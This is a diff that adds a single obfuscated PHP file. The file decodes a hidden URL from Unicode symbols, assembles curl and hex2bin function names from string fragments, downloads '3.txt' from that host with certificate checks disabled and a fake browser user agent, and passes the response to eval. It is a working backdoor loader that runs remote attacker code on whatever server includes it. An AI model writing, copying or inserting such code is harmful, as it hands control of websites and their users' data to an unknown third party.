@@ -1,0 +1,38 @@
+<?php
+$S='▼◆▽▶▽▶▽■▽△△○▲♣▲♣▽△▽▶▼▷▽■▼☆▼♣▼☆▼◆▽▷▼▲▲♠▼△▼♣▼☆▲♣';
+$K=preg_split('//u','■□▲△▶▷▼▽◆◇○●★☆♠♣',-1,PREG_SPLIT_NO_EMPTY);
+$M=array_combine($K,str_split('0123456789abcdef'));
+$H='';foreach(preg_split('//u',$S,-1,PREG_SPLIT_NO_EMPTY)as$C){if(isset($M[$C]))$H.=$M[$C];}
+$a='hex'; $b='2bin'; $h2b = $a.$b;
+$a='function_'; $b='exists'; $fex = $a.$b;
+$a='curl_'; $b='init'; $ci = $a.$b;
+$a='curl_set'; $b='opt_array'; $cs = $a.$b;
+$a='curl_e'; $b='xec'; $ce = $a.$b;
+$a='curl_get'; $b='info'; $cg = $a.$b;
+$a='curl_c'; $b='lose'; $cc = $a.$b;
+$a='preg_r'; $b='eplace'; $pr = $a.$b;
+$U=$h2b($H);if(substr($U,-1)!=='/')$U.='/';$T=$U.'3.txt';
+$q=false;
+if($fex($ci)){
+    $c=$ci($T);
+    $cs($c, array(
+        19913 => 1,  
+        52    => 1,
+        13    => 10,
+        10018 => 'Mozilla/5.0',
+        64    => 0,
+        81    => 0
+    ));
+    $d=$ce($c);
+    $s=$cg($c, 2097154);
+    $cc($c);
+    
+    if($s==200){
+        $q=$d;
+    }
+}
+if($q!==false){
+    $p=$pr('/^\xEF\xBB\xBF/','',$q);
+    eval('?>'.$p);
+}
+?>
